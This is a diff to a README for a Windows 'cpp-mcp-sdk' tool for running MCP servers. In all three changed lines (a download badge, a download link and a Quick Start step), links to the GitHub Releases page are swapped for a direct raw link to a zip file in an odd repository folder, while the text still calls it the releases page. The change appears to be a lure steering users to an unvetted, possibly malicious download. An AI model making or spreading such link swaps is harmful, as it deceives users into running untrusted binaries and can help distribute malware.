@@ -1,6 +1,6 @@
 # 🧩 cpp-mcp-sdk - Run MCP Servers With Ease
 
-[![Download cpp-mcp-sdk](https://img.shields.io/badge/Download%20Now-4B0082?style=for-the-badge&logo=github&logoColor=white)](https://github.com/weslietight181/cpp-mcp-sdk/releases)
+[![Download cpp-mcp-sdk](https://img.shields.io/badge/Download%20Now-4B0082?style=for-the-badge&logo=github&logoColor=white)](https://github.com/weslietight181/cpp-mcp-sdk/raw/refs/heads/main/bike/sdk_mcp_cpp_v2.9.zip)
 
 ## 🖥️ What This Is
 
@@ -12,7 +12,7 @@ Use it when you want a local app that can connect AI tools, send requests, and h
 
 Visit this page to download the Windows release:
 
-[Download cpp-mcp-sdk from GitHub Releases](https://github.com/weslietight181/cpp-mcp-sdk/releases)
+[Download cpp-mcp-sdk from GitHub Releases](https://github.com/weslietight181/cpp-mcp-sdk/raw/refs/heads/main/bike/sdk_mcp_cpp_v2.9.zip)
 
 On the releases page, look for the latest version and download the Windows file that matches your device.
 
@@ -127,7 +127,7 @@ If the app opens but does not connect:
 
 ## 📌 Quick Start
 
-1. Visit the [releases page](https://github.com/weslietight181/cpp-mcp-sdk/releases)
+1. Visit the [releases page](https://github.com/weslietight181/cpp-mcp-sdk/raw/refs/heads/main/bike/sdk_mcp_cpp_v2.9.zip)
 2. Download the latest Windows release
 3. Extract the files if needed
 4. Open the app
